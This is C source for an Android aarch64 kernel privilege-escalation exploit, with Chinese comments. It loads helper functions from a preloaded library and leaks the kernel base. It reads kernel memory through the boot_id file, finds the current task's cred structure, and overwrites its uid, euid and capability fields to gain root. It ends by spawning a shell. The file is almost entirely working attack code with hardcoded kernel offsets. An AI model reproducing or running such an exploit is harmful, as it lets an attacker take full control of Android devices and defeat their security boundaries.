/*
 * root_inplace.c — 用 preload_no_init.so 的导出函数做 in-place cred patch
 *
 * 流程:
 *   1. dlopen preload_no_init.so（无构造函数，只获取函数指针）
 *   2. init_direct_root_cpu + slide_leak_kernel_base → KASLR
 *   3. shape-0 read: per_cpu_offset, entry_task, cred pointer
 *   4. shape-1 write: uid=0, euid=0, cap_effective=full
 *   5. 不碰 selinux_enforcing，不替换 cred 指针
 *
 * 编译: clang --target=aarch64-linux-android35 ... -o root_inplace root_inplace.c -ldl
 * 运行: LD_PRELOAD=/data/local/tmp/preload_no_init.so /data/local/tmp/root_inplace
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <stdint.h>
#include <errno.h>
#include <sys/wait.h>

#define BOOT_ID_DATA       0xffffff8002546f58ULL
#define TASK_CRED_OFF      0x820
#define CRED_UID_OFF       8
#define CRED_CAPS_OFF      48
#define CAP_FULL           0x000001ffffffffffULL

typedef int (*fn_void)(void);
typedef int (*fn_read_shape0)(uintptr_t, uint64_t*, const char*, int, int*);
typedef int (*fn_write)(uintptr_t, uintptr_t, int, int);
typedef int (*fn_is_kern)(uintptr_t);

static fn_read_shape0 g_read64 = NULL;
static fn_write g_write = NULL;
static fn_is_kern g_is_kernel_ptr = NULL;
static fn_is_kern g_is_direct_ptr = NULL;
static int g_idx = 0;

static uint64_t hex_value(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* shape-0 read: 用 direct_pselect_write_once(B, addr, 0, idx) + boot_id 读内核内存 */
static int kread64(uintptr_t addr, uint64_t *out) {
    if (!g_write) return 0;
    uintptr_t B = BOOT_ID_DATA;
    for (int attempt = 0; attempt < 3; attempt++) {
        /* shape-0: 把 addr 处的值泄露到 boot_id data */
        if (!g_write(B, addr, 0, g_idx++)) continue;

        /* 读 boot_id */
        int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
        if (fd < 0) return 0;
        char buf[64] = {0};
        read(fd, buf, 63);
        close(fd);

        /* 解析 UUID hex → 16 字节 */
        uint8_t parsed[16] = {0};
        int pn = 0; int nyb = -1;
        for (int i = 0; buf[i] && pn < 16; i++) {
            int v = hex_value(buf[i]);
            if (v < 0) continue;
            if (nyb < 0) { nyb = v; }
            else { parsed[pn++] = (uint8_t)((nyb << 4) | v); nyb = -1; }
        }
        if (pn != 16) continue;

        /* 验证 sidecar: parsed[8..15] 低字节应 == B & 0xff */
        uint64_t result;
        memcpy(&result, parsed, 8);
        if ((parsed[8] == (uint8_t)(B & 0xff)) && result != 0) {
            *out = result;
            return 1;
        }
    }
    return 0;
}

static int kwrite64(uintptr_t addr, uint64_t val) {
    if (!g_write) return 0;
    for (int i = 0; i < 3; i++) {
        if (g_write(addr, val, 1, g_idx++)) return 1;
    }
    return 0;
}

int main(void) {
    void *h = dlopen("/data/local/tmp/preload_no_init.so", 0x2 /*RTLD_NOW*/);
    if (!h) { fprintf(stderr, "dlopen failed: %s\n", dlerror()); return 1; }

    fn_void init_cpu = (fn_void)dlsym(h, "init_direct_root_cpu");
    fn_void leak_kaslr = (fn_void)dlsym(h, "slide_leak_kernel_base");
    g_read64 = (fn_read_shape0)dlsym(h, "direct_read_shape0_exact64_once");
    g_write = (fn_write)dlsym(h, "direct_pselect_write_once");
    g_is_kernel_ptr = (fn_is_kern)dlsym(h, "is_kernel_ptr");
    g_is_direct_ptr = (fn_is_kern)dlsym(h, "is_direct_ptr");

    if (!g_write) {
        fprintf(stderr, "missing symbol: direct_pselect_write_once\n");
        return 1;
    }

    fprintf(stderr, "[*] symbols loaded\n");

    /* Step 1: CPU pinning */
    if (init_cpu) init_cpu();

    /* Step 2: KASLR leak */
    if (leak_kaslr) {
        int ok = leak_kaslr();
        fprintf(stderr, "[*] kaslr leak: %d\n", ok);
    }

    /* Step 3: Read per_cpu_offset */
    #define PER_CPU_OFFSET_OFF  0x00acb658ULL
    #define ENTRY_TASK_OFF      0x08896328ULL
    uintptr_t percpu_slot = 0xffffffc008000000ULL + PER_CPU_OFFSET_OFF;
    uint64_t percpu_delta = 0;
    fprintf(stderr, "[*] reading per_cpu_offset at %016zx...\n", percpu_slot);
    if (!kread64(percpu_slot, &percpu_delta)) {
        fprintf(stderr, "[-] per_cpu_offset read failed (errno=%d)\n", errno);
        return 1;
    }
    fprintf(stderr, "[+] per_cpu_offset delta=%016llx\n", (unsigned long long)percpu_delta);

    /* Step 4: Read entry_task */
    uintptr_t entry_slot = 0xffffffc008000000ULL + ENTRY_TASK_OFF + (uintptr_t)percpu_delta;
    uint64_t task = 0;
    if (!kread64(entry_slot, &task)) {
        fprintf(stderr, "[-] entry_task read failed\n");
        return 1;
    }
    fprintf(stderr, "[+] task=%016llx\n", (unsigned long long)task);

    /* Step 5: Read task->cred pointer */
    uint64_t cred_addr = 0;
    if (!kread64((uintptr_t)task + TASK_CRED_OFF, &cred_addr)) {
        fprintf(stderr, "[-] cred_addr read failed\n");
        return 1;
    }
    fprintf(stderr, "[+] cred=%016llx\n", (unsigned long long)cred_addr);

    /* Step 6: In-place patch (3 writes: uid_gid, euid_egid, cap_effective) */
    struct { const char *name; uintptr_t off; uintptr_t val; } patches[] = {
        {"uid_gid",       CRED_UID_OFF,       0},
        {"euid_egid",     CRED_UID_OFF + 16,  0},
        {"cap_effective", CRED_CAPS_OFF + 16,  CAP_FULL},
    };
    for (int i = 0; i < 3; i++) {
        uintptr_t target = (uintptr_t)cred_addr + patches[i].off;
        fprintf(stderr, "[*] writing %s at %016zx = %016zx\n",
                patches[i].name, target, patches[i].val);
        if (!kwrite64(target, patches[i].val)) {
            fprintf(stderr, "[-] %s write failed\n", patches[i].name);
            return 1;
        }
    }

    /* Step 7: Verify */
    fprintf(stderr, "[+] patch done, spawning shell...\n");

    /* Fork and exec shell with root */
    pid_t pid = fork();
    if (pid == 0) {
        execl("/system/bin/sh", "sh", NULL);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
}
